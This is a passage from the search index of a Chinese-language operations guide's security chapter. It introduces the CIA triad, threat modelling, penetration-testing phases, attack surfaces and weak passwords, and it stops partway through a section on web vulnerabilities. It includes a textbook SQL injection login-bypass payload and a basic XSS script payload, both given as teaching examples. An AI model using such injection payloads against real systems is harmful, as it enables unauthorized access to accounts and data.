<p>https://askubuntu.com/a/1138405\uff0c\u200b\u5f15\u7528\u200b\u81ea\u200b The Debian System: Concepts and Techniques \u200b\u4e00\u4e66\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/security/","title":"\u5b89\u5168","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@tiankaima\u3001@Crabtux\u3001@JiaminL</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u9605\u8bfb\u200b\u6ce8\u610f\u4e8b\u9879\u200b</p> <p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u6982\u5ff5\u200b\u4ecb\u7ecd\u200b\u90e8\u5206\u200b\u4e0d\u662f\u200b\u4e25\u8083\u200b\u7684\u200b\u5b66\u672f\u6027\u200b\u4ecb\u7ecd\u200b\uff0c\u200b\u5b58\u5728\u200b\u5927\u5e45\u5ea6\u200b\u7684\u200b\u7b80\u5316\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u4f1a\u200b\u5bf9\u200b\u62bd\u8c61\u200b\u7684\u200b\u6982\u5ff5\u200b\u8fdb\u884c\u200b\u8be6\u7ec6\u200b\u89e3\u91ca\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u4e00\u90e8\u5206\u200b\u53c2\u8003\u200b\u4e86\u200b\u300a\u200b\u8ba1\u7b97\u673a\u200b\u5b89\u5168\u200b\u300b\u200b\u8bfe\u7a0b\u200b\u4e0e\u200b 2024 \u200b\u5e74\u200b 3 \u200b\u6708\u200b\u5c0f\u805a\u200b\u6d3b\u52a8\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/security/#what-is-security","title":"\u300c\u200b\u5b89\u5168\u200b\u300d\u200b\u662f\u200b\u4ec0\u4e48\u200b\uff1f","text":"<p>\u300c\u200b\u4fe1\u606f\u5b89\u5168\u200b\u300d\u200b\u91cd\u70b9\u200b\u5173\u6ce8\u200b\u4e09\u4e2a\u200b\u65b9\u9762\u200b\uff1a\u200b\u673a\u5bc6\u6027\u200b\uff08Confidentiality\uff09\u3001\u200b\u5b8c\u6574\u6027\u200b\uff08Integrity\uff09\u200b\u548c\u200b\u53ef\u7528\u6027\u200b\uff08Availability\uff09\uff0c\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b CIA \u200b\u4e09\u8981\u7d20\u200b\uff1a</p> <ul> <li>\u200b\u673a\u5bc6\u6027\u200b\uff1a\u200b\u786e\u4fdd\u200b\u4fe1\u606f\u200b\u53ea\u80fd\u200b\u88ab\u200b\u6388\u6743\u200b\u7684\u200b\u4eba\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4f8b\u5982\u200b\u52a0\u5bc6\u200b\u6570\u636e\u200b\u3001\u200b\u5bf9\u200b\u9700\u8981\u200b\u8bbf\u95ee\u4fe1\u606f\u200b\u7684\u200b\u4eba\u5458\u200b\u8fdb\u884c\u200b\u8eab\u4efd\u9a8c\u8bc1\u200b\u7b49\u200b\u3002</li> <li>\u200b\u5b8c\u6574\u6027\u200b\uff1a\u200b\u786e\u4fdd\u200b\u4fe1\u606f\u200b\u4e0d\u200b\u88ab\u200b\u7be1\u6539\u200b\u3001\u200b\u635f\u574f\u200b\u3001\u200b\u4e22\u5931\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6570\u5b57\u7b7e\u540d\u200b\u7b49\u200b\u3002</li> <li>\u200b\u53ef\u7528\u6027\u200b\uff1a\u200b\u786e\u4fdd\u200b\u4fe1\u606f\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u200b\u53ef\u7528\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5907\u4efd\u200b\u3001\u200b\u5197\u4f59\u200b\u7b49\u200b\u3002</li> </ul> <p>\u200b\u5c3d\u7ba1\u200b\u4ece\u200b\u8fd9\u4e2a\u200b\u6a21\u578b\u200b\u6765\u8bb2\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u300c\u200b\u56e0\u4e3a\u200b\u6ca1\u6709\u200b\u6070\u5f53\u200b\u8bbe\u7f6e\u200b RAID \u200b\u548c\u200b\u5907\u4efd\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u300d\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u4e5f\u200b\u662f\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff08\u200b\u7b26\u5408\u200b\u5b8c\u6574\u6027\u200b\u548c\u200b\u53ef\u7528\u6027\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u672c\u200b\u90e8\u5206\u200b\u8ba8\u8bba\u200b\u7684\u200b\u300c\u200b\u5b89\u5168\u200b\u300d\u200b\u66f4\u200b\u591a\u200b\u5173\u6ce8\u200b\u84c4\u610f\u200b\u7684\u200b\u6076\u610f\u200b\u884c\u4e3a\u200b\u548c\u200b\u653b\u51fb\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u8bef\u64cd\u4f5c\u200b\u3001\u200b\u81ea\u7136\u707e\u5bb3\u200b\u3001\u200b\u786c\u4ef6\u200b\u6545\u969c\u200b\u7b49\u200b\u3002\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u8bf4\u200b\u4e24\u8005\u200b\u90fd\u200b\u662f\u200b\u300c\u200b\u5b89\u5168\u200b\u300d\u2014\u2014\u200b\u524d\u8005\u200b\u662f\u200b \"security\"\uff0c\u200b\u800c\u200b\u540e\u8005\u200b\u662f\u200b \"safety\"\u3002</p> <p>\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u81ea\u5df1\u200b\u7ef4\u62a4\u200b\u7684\u200b\u7cfb\u7edf\u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u5f88\u200b\u9057\u61be\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u4e16\u754c\u200b\u4e0a\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u6709\u200b\u7edd\u5bf9\u200b\u5b89\u5168\u200b\u7684\u200b\u7cfb\u7edf\u200b\u3002\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5bf9\u200b\u81ea\u5df1\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u5b89\u5168\u200b\u6a21\u578b\u200b\uff08\u200b\u5a01\u80c1\u200b\u6a21\u578b\u200b\uff09\u200b\u6709\u200b\u57fa\u672c\u200b\u7684\u200b\u4e86\u89e3\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5224\u65ad\u200b\u81ea\u5df1\u200b\u9700\u8981\u200b\u505a\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u505a\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u8fbe\u5230\u200b\u4fbf\u5229\u200b\u4e0e\u200b\u5b89\u5168\u200b\u7684\u200b\u5e73\u8861\u200b\uff08\u200b\u4e00\u4e9b\u200b\u5b89\u5168\u200b\u52a0\u56fa\u200b\u63aa\u65bd\u200b\u6216\u591a\u6216\u5c11\u200b\u4f1a\u200b\u5f71\u54cd\u200b\u6b63\u5e38\u200b\u7684\u200b\u4f7f\u7528\u200b\uff09\u3002</p>"},{"location":"ops/security/#prevention","title":"\u4e8b\u524d\u200b\uff1a\u200b\u9884\u9632","text":"<p>\u200b\u9884\u9632\u200b\u5b89\u5168\u4e8b\u4ef6\u200b\u4f9d\u8d56\u4e8e\u200b\u5bf9\u200b\u5a01\u80c1\u200b\u7684\u200b\u4e86\u89e3\u200b\uff08\u200b\u5a01\u80c1\u200b\u6a21\u578b\u200b\u5206\u6790\u200b\uff09\uff0c\u200b\u4e00\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u4ece\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u89c6\u89d2\u200b\u8003\u8651\u200b\u95ee\u9898\u200b\uff1a\u200b\u5982\u679c\u200b\u6211\u200b\u662f\u200b\u4e00\u4e2a\u200b\u653b\u51fb\u8005\u200b\uff0c\u200b\u6211\u4f1a\u200b\u600e\u4e48\u200b\u505a\u200b\uff1f</p>"},{"location":"ops/security/#network-attack-ideas","title":"\u7f51\u7edc\u653b\u51fb\u200b\u7684\u200b\u57fa\u672c\u601d\u8def","text":"<p>\u200b\u6cd5\u5f8b\u200b\u8b66\u544a\u200b</p> <p>\u200b\u8fdb\u884c\u200b\u6e17\u900f\u200b\u6d4b\u8bd5\u200b\u5fc5\u987b\u200b\u5f97\u5230\u200b\u6240\u6709\u8005\u200b\u660e\u786e\u200b\u7684\u200b\u6388\u6743\u200b\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u89e6\u72af\u200b\u6cd5\u5f8b\u200b\u3002</p> <p>\u200b\u7f51\u7edc\u653b\u51fb\u200b\u7684\u200b\u57fa\u672c\u601d\u8def\u200b\u5728\u200b\u6e17\u900f\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u6d41\u7a0b\u200b\u4e2d\u200b\u6709\u6240\u200b\u4f53\u73b0\u200b\uff1a</p> <ul> <li>\u200b\u4fe1\u606f\u200b\u6536\u96c6\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u9700\u8981\u200b\u5c3d\u53ef\u80fd\u200b\u4e86\u89e3\u200b\u76ee\u6807\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5404\u7c7b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u76ee\u6807\u200b\u670d\u52a1\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u3001\u200b\u5f00\u653e\u200b\u7684\u200b\u7aef\u53e3\u200b\u3001\u200b\u8fd0\u884c\u200b\u7684\u200b\u670d\u52a1\u200b\u7b49\u7b49\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300c\u200b\u4fe1\u606f\u200b\u8d44\u4ea7\u200b\u300d\u3002</li> <li>\u200b\u8fb9\u754c\u200b\u7a81\u7834\u200b\uff1a\u200b\u5728\u200b\u83b7\u53d6\u4fe1\u606f\u200b\u4e4b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u7a81\u7834\u200b\u76ee\u6807\u200b\u7cfb\u7edf\u200b\u7684\u200b\u8fb9\u754c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u901a\u8fc7\u200b\u66b4\u529b\u7834\u89e3\u200b\u5bc6\u7801\u200b\u3001\u200b\u5229\u7528\u200b\u6f0f\u6d1e\u200b\u7b49\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u5347\u200b\u81ea\u8eab\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u4e3a\u200b\u4e0b\u200b\u4e00\u6b65\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\u505a\u200b\u51c6\u5907\u200b\u3002</li> <li>\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\uff1a\u200b\u5728\u200b\u7a81\u7834\u200b\u8fb9\u754c\u200b\u4e4b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5728\u5185\u200b\u7f51\u4e2d\u200b\u79fb\u52a8\u200b\uff0c\u200b\u653b\u51fb\u200b\u5185\u7f51\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u673a\u5668\u200b\uff0c\u200b\u83b7\u53d6\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u63d0\u5347\u200b\u6743\u9650\u200b\uff0c\u200b\u6700\u7ec8\u200b\u8fbe\u6210\u200b\u81ea\u5df1\u200b\u7684\u200b\u76ee\u7684\u200b\u3002\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5c06\u200b\u81ea\u5df1\u200b\u4f7f\u7528\u200b\u7684\u200b\u653b\u51fb\u65b9\u5f0f\u200b\u6301\u4e45\u200b\u5316\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u5229\u7528\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u88ab\u200b\u4fee\u590d\u200b\u4e4b\u540e\u200b\u4ecd\u7136\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u76ee\u6807\u200b\u7cfb\u7edf\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6e05\u7406\u200b\u81ea\u5df1\u200b\u7684\u200b\u75d5\u8ff9\u200b\uff0c\u200b\u907f\u514d\u200b\u88ab\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u53d1\u73b0\u200b\u3002</li> </ul>"},{"location":"ops/security/#attack-surface","title":"\u653b\u51fb\u9762","text":"<p>\u200b\u653b\u51fb\u9762\u200b\u662f\u200b\u7cfb\u7edf\u200b\u4e2d\u53ef\u8fbe\u200b\u7684\u200b\u3001\u200b\u53ef\u80fd\u200b\u88ab\u200b\u5229\u7528\u200b\u7684\u200b\u8106\u5f31\u200b\u70b9\u200b\u3002\u200b\u653b\u51fb\u200b\u65b9\u200b\u548c\u200b\u9632\u5b88\u200b\u65b9\u90fd\u200b\u9700\u8981\u200b\u5bf9\u200b\u653b\u51fb\u9762\u200b\u6709\u6240\u200b\u4e86\u89e3\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u6709\u6548\u200b\u653b\u51fb\u200b/\u200b\u9632\u5fa1\u200b\u3002</p> <ul> <li>\u200b\u8f6f\u4ef6\u200b\u653b\u51fb\u9762\u200b\uff1a\u200b\u4f8b\u5982\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u7f51\u200b\u7684\u200b Web \u200b\u5e94\u7528\u200b\u5e38\u5e38\u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u9996\u9009\u200b\u7684\u200b\u76ee\u6807\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u4e9b\u200b\u5e94\u7528\u200b\u76f4\u63a5\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u7f51\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u5904\u7406\u200b\u5404\u79cd\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\uff0c\u200b\u66f4\u200b\u5bb9\u6613\u200b\u53d7\u5230\u200b\u653b\u51fb\u200b\uff1b\u200b\u6b64\u5916\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u670d\u52a1\u5668\u8f6f\u4ef6\u200b\uff08\u200b\u4f8b\u5982\u200b\u6570\u636e\u5e93\u200b\uff09\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u6f0f\u6d1e\u200b\u6216\u8005\u200b\u914d\u7f6e\u200b\u4e0d\u5f53\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u76ee\u6807\u200b\u3002</li> <li>\u200b\u7f51\u7edc\u653b\u51fb\u200b\u9762\u200b\uff1a\u200b\u6307\u5728\u200b\u6570\u636e\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5b58\u5728\u200b\u7684\u200b\u5404\u79cd\u200b\u53ef\u80fd\u200b\u88ab\u200b\u653b\u51fb\u200b\u5229\u7528\u200b\u7684\u200b\u8106\u5f31\u200b\u70b9\u200b\uff0c\u200b\u4e3b\u8981\u200b\u6d89\u53ca\u200b\u7f51\u7edc\u534f\u8bae\u200b\u548c\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8001\u65e7\u200b\u7684\u200b\u534f\u8bae\u200b\uff08HTTP\u3001\u200b\u65e9\u671f\u200b\u7684\u200b SSL/TLS \u200b\u7248\u672c\u200b\u7b49\u200b\uff09\u200b\u5bb9\u6613\u200b\u53d7\u5230\u200b\u4e2d\u95f4\u4eba\u200b\u653b\u51fb\u200b\uff1b\u200b\u8bf8\u5982\u200b DNS \u200b\u52ab\u6301\u200b\u3001ARP \u200b\u6b3a\u9a97\u200b\u7b49\u200b\u653b\u51fb\u200b\u4e5f\u200b\u662f\u200b\u5e38\u89c1\u200b\u7684\u200b\u7f51\u7edc\u653b\u51fb\u200b\u65b9\u5f0f\u200b\u3002</li> <li>\u200b\u4eba\u4e3a\u200b\u653b\u51fb\u9762\u200b\uff1a\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u4ece\u4eba\u200b\u5165\u624b\u200b\u6bd4\u200b\u4ece\u200b\u673a\u5668\u200b\u5165\u624b\u200b\u653b\u51fb\u200b\u66f4\u200b\u7b80\u5355\u200b\u3002\u200b\u793e\u4f1a\u200b\u5de5\u7a0b\u5b66\u200b\u653b\u51fb\u200b\uff08\u200b\u4f8b\u5982\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u3001\u200b\u7535\u8bdd\u200b\u8bc8\u9a97\u200b\u7b49\u200b\uff09\u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u83b7\u53d6\u4fe1\u606f\u200b\u7684\u200b\u5e38\u89c1\u200b\u65b9\u5f0f\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u56e0\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b\u758f\u5ffd\u200b\u6216\u8005\u200b\u4e0d\u5f53\u200b\u64cd\u4f5c\u200b\u5bfc\u81f4\u200b\u81ea\u5df1\u200b\u6210\u4e3a\u200b\u66f4\u200b\u5e9e\u5927\u200b\u7684\u200b\u7cfb\u7edf\u200b\u88ab\u200b\u653b\u51fb\u200b\u7684\u200b\u8df3\u677f\u200b\u3002</li> </ul>"},{"location":"ops/security/#common-vulnerabilities","title":"\u5e38\u89c1\u200b\u6f0f\u6d1e\u200b\u4e0e\u200b\u653b\u51fb\u200b\u65b9\u6cd5","text":""},{"location":"ops/security/#weak-passwords","title":"\u5f31\u200b\u53e3\u4ee4","text":"<p>\u200b\u7531\u4e8e\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u5b9e\u5728\u200b\u662f\u200b\u592a\u8fc7\u200b\u5e38\u89c1\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u5728\u200b\u8fd9\u91cc\u200b\u5355\u72ec\u200b\u5217\u51fa\u200b\u3002\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u5bc6\u7801\u200b\u7684\u200b\u5b57\u5178\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u7ebf\u200b\u6216\u8005\u200b\u79bb\u7ebf\u200b\u5730\u200b\u5c1d\u8bd5\u200b\u8fd9\u4e9b\u200b\u5bc6\u7801\u200b\u3002\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u5bc6\u7801\u200b\u5305\u62ec\u200b \"123456\"\u3001\"password\" \u200b\u7b49\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4ece\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u5bc6\u7801\u200b\u5e93\u4e2d\u200b\u83b7\u53d6\u200b\u6307\u5b9a\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u5c1d\u8bd5\u200b\u767b\u5f55\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f51\u7ad9\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u6216\u200b\u76f8\u4f3c\u200b\u5bc6\u7801\u200b\u7684\u200b\u4e60\u60ef\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u80fd\u591f\u200b\u8f7b\u677e\u200b\u767b\u5f55\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6307\u5b9a\u200b\u7528\u6237\u200b\u7684\u200b\u4e2a\u4eba\u4fe1\u606f\u200b\uff08\u200b\u4f8b\u5982\u200b\u59d3\u540d\u200b\u3001\u200b\u751f\u65e5\u200b\u3001\u200b\u5de5\u4f5c\u200b\u5355\u4f4d\u200b\u7b49\u200b\uff09\u200b\u5c1d\u8bd5\u200b\u6309\u200b\u89c4\u5f8b\u200b\u6784\u9020\u200b\u5bc6\u7801\u200b\u5e76\u200b\u5c1d\u8bd5\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u5bc6\u7801\u672c\u200b\u4e2d\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u76f8\u5bf9\u200b\u590d\u6742\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>1qaz@WSX</code>\uff08\u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5bc6\u7801\u200b\u5b8c\u7f8e\u200b\u7b26\u5408\u200b\u6709\u200b\u5927\u5c0f\u5199\u200b\u3001\u200b\u7279\u6b8a\u7b26\u53f7\u200b\u548c\u200b\u57fa\u7840\u200b\u7684\u200b\u957f\u5ea6\u200b\u8981\u6c42\u200b\uff0c\u200b\u4f46\u662f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5f88\u5dee\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u60f3\u200b\u4e00\u4e0b\u200b\u4e3a\u4ec0\u4e48\u200b\uff09\u200b\u7b49\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u6216\u200b\u5185\u90e8\u200b\u7f51\u7edc\u670d\u52a1\u200b\u5b58\u5728\u200b\u56fa\u5b9a\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u5bc6\u7801\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u200b\u4f8b\u5982\u200b\u751f\u65e5\u200b\u3001\u200b\u8eab\u4efd\u8bc1\u200b\u540e\u200b\u516d\u4f4d\u200b\u4e4b\u7c7b\u200b\u6709\u200b\u89c4\u5f8b\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u5bc6\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u200b\u8981\u6c42\u200b\u7528\u6237\u200b\u4fee\u6539\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u5f88\u200b\u5bb9\u6613\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u83b7\u53d6\u200b\u5e76\u200b\u5229\u7528\u200b\u3002</p> <p>\u200b\u5185\u200b\u7f51\u200b \u2260 \u200b\u5b89\u5168\u200b</p> <p>\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u8bef\u533a\u200b\u662f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u7cfb\u7edf\u200b\u53ea\u6709\u200b\u5185\u200b\u7f51\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u6240\u4ee5\u200b\u968f\u4fbf\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u5bc6\u7801\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5185\u200b\u7f51\u200b\u5e76\u975e\u200b\u56fa\u82e5\u91d1\u6c64\u200b\uff0c\u200b\u5f53\u200b\u653b\u51fb\u8005\u200b\u901a\u8fc7\u200b\u5916\u90e8\u200b\u670d\u52a1\u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u65b9\u5f0f\u200b\u8fdb\u5165\u200b\u5185\u200b\u7f51\u200b\u4e4b\u540e\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u7b80\u5355\u200b\u7684\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4f1a\u200b\u6210\u4e3a\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u76ee\u6807\u200b\u3002</p>"},{"location":"ops/security/#software-vulnerabilities","title":"\u8f6f\u4ef6\u200b\u6f0f\u6d1e","text":""},{"location":"ops/security/#web-applications","title":"\u7f51\u7edc\u5e94\u7528","text":"<p>\u200b\u7f51\u7edc\u5e94\u7528\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u662f\u200b\u653b\u51fb\u200b\u5e38\u89c1\u200b\u7684\u200b\u5207\u5165\u70b9\u200b\u4e4b\u4e00\u200b\u3002\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u4e00\u7c7b\u200b\u95ee\u9898\u200b\u662f\u200b\uff1a\u200b\u7531\u4e8e\u200b\u4fe1\u4efb\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6076\u610f\u200b\u6784\u9020\u200b\u7684\u200b\u6570\u636e\u200b\u4ee5\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u65b9\u5f0f\u200b\u88ab\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b SQL \u200b\u6ce8\u5165\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e0b\u9762\u200b\u7684\u200b SQL \u200b\u67e5\u8be2\u200b\uff1a</p> <pre><code>SELECT * FROM users WHERE username = '$username' AND password = '$password';\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u9009\u62e9\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u62fc\u63a5\u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6784\u9020\u200b\u8fd9\u4e2a\u200b\u67e5\u8be2\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b <code>username</code> \u200b\u662f\u200b <code>admin</code>\uff0c<code>password</code> \u200b\u662f\u200b <code>123' OR '1'='1</code>\uff0c\u200b\u90a3\u4e48\u200b\u67e5\u8be2\u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b\uff1a</p> <pre><code>SELECT * FROM users WHERE username = 'admin' AND password = '123' OR '1'='1';\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u67e5\u8be2\u200b\u5c31\u200b\u4e0d\u518d\u200b\u8d77\u5230\u200b\u68c0\u67e5\u200b\u5bc6\u7801\u200b\u7684\u200b\u4f5c\u7528\u200b\uff0c\u200b\u6076\u610f\u200b\u7528\u6237\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4ee5\u200b <code>admin</code> \u200b\u7684\u200b\u8eab\u4efd\u200b\u767b\u5f55\u200b\u7cfb\u7edf\u200b\u3002</p> <p>\u200b\u76f8\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\u8fd8\u6709\u200b XSS\uff08\u200b\u8de8\u7ad9\u200b\u811a\u672c\u200b\u653b\u51fb\u200b\uff09\uff1a\u200b\u5982\u679c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u76f4\u63a5\u200b\u5c06\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u63d2\u5165\u200b\u5230\u200b HTML \u200b\u4e2d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u6076\u610f\u200b\u7684\u200b HTML \u200b\u4ee3\u7801\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>&lt;p&gt;\u200b\u7528\u6237\u200b\u8bc4\u8bba\u200b\uff1a{{ comments }}&lt;/p&gt;\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u4e0d\u200b\u5bf9\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u8fdb\u884c\u200b\u8fc7\u6ee4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u5185\u5bb9\u200b\u4e3a\u200b <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> \u200b\u7684\u200b\u8bc4\u8bba\u200b\uff0c\u200b\u6784\u9020\u200b\u51fa\u200b\u8fd9\u6837\u200b\u7684\u200b HTML \u200b\u4ee3\u7801\u200b\uff1a</p> 